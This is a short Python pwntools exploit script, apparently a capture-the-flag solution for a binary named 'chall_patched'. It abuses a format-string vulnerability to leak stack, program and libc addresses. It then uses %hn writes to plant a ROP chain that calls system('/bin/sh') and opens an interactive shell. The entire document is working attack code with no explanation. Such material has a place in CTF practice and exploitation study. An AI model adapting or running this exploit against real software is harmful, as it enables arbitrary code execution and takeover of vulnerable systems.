#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def trigger(cmd):
	sla(b"> ", b"3")
	sla(b"cmd?\n", cmd)

def overwrite(addr, val):
	l = []
	l.append([val & 0xffff, 0])
	val = val >> 16
	l.append([val & 0xffff, 2])
	val = val >> 16
	l.append([val & 0xffff, 4])
	l = sorted(l, key = lambda x: x[0])

	payload = b"n" # char *nl = strchr(cmd, '\\n'); 

	payload += f'%{l[0][0] - 1}c%14$hn'.encode()
	payload += f'%{l[1][0] - l[0][0]}c%15$hn'.encode()
	payload += f'%{l[2][0] - l[1][0]}c%16$hn'.encode()
	payload = payload.ljust(0x30, b'A') + p64(addr + l[0][1]) + p64(addr + l[1][1]) + p64(addr + l[2][1])
	trigger(payload)

script = '''
# printf trig
brva 0x15B6
# leave ret main
brva 0x1730
'''

p = process('./chall_patched')
#p = gdb.debug('./chall_patched', gdbscript = script)
#debug()

payload = b"%14$p.%11$p.%15$p\x00"
trigger(payload)
stack_leak = int(p.recv(14), 16)
p.recv(1)
code_base = int(p.recv(14), 16) - 0x16f7
p.recv(1)
libc_base = int(p.recv(14), 16) - 0x62142

lleak("code", code_base)
lleak("libc", libc_base)
lleak("stack", stack_leak)

main_rbp = stack_leak + 0x20
pop_rdi = libc_base + 0x000000000002a3e5
ret = pop_rdi + 1
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
system = libc_base + libc.symbols['system']

overwrite(main_rbp + 8, pop_rdi)
overwrite(main_rbp + 0x10, binsh)
overwrite(main_rbp + 0x18, ret)
overwrite(main_rbp + 0x20, system)

sla(b"> ", b"4")

p.interactive()
